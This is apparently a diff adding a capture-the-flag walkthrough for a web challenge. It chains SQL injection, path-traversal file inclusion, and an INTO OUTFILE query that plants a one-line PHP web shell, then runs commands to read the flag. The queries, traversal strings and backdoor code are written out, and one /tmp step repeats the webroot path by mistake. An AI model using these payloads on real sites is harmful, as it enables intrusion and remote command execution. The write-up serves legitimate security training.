@@ -1,0 +1,29 @@
+- This website has very little features, with only a landing page and a login page visible
+
+- Messing around with the login page, you will find SQL errors indicating that it is SQL injectable
+        - Exploiting the SQLi will reveal that the database has nothing interesting in it
+
+- Whenever you visit a page, the endpoint itself does not change but instead the GET query `?page=` changes, indicating possible path traversal
+        - If you try the page `../../../../../../../../etc/passwd`, you will get the file showing that path traversal is present
+        - If you try something like `index.php` to try and get the source code, it does not give the php source code inidcating that this is specifically LFI
+
+- Going back to the SQLi, if you can write a php file to the webroot, it can lead to RCE
+        - Try a query like: ' UNION SELECT 'a',NULL,NULL INTO OUTFILE '/var/www/html/test.php'--
+        - You will see an error permission denied, indicating that you can't write to the webroot
+        - however, since we have LFI, writing a php file anywhere will lead to RCE
+
+- Trying to write to /tmp
+        - Try a query like: ' UNION SELECT 'a',NULL,NULL INTO OUTFILE '/var/www/html/test.php'--
+                - Doesnt show an error
+        - Visit the page `?page=../../../../../../../../tmp/testing.txt` and you will see your file
+
+- Writing a php backdoor
+        - A php backdoor can be made in one line using something like `<?php echo system($_GET['cmd']); ?>`
+        - Write that to a file using the query: ' UNION SELECT '<?php echo system($_GET["cmd"]); ?>',NULL,NULL INTO OUTFILE '/tmp/testing2.txt'--
+                - NOTE: you have to change the filename or you will get the error "file already exists"
+
+- Finding the flag
+        - Test that your backdoor works by visiting `/?page=../../../../../../../tmp/testing2.txt&cmd=id`
+        - You will see that the command is run
+        - From there, you can run the command `ls /var/www/html` and see a flag file
+        - Then just cat the flag file and you solve the challenge
